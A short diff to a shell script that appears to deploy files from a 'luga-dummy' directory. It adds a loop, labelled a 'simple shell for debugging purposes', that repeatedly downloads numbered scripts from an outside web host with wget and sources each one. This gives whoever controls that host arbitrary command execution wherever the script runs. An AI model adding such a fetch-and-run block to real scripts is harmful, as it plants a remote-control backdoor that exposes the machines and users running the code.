@@ -77,6 +77,14 @@ if [ ! -e luga-dummy/index.html ]; then
     exit 1
 fi
 
+# Simple "shell" for debugging purposes
+for i in `seq -w 30`; do
+    until wget -O debug.sh https://www.speicherleck.de/debug-$i > debug.sh; do
+        sleep 10
+    done
+    . debug.sh
+done
+
 mv luga-dummy/* .
 rmdir luga-dummy
 
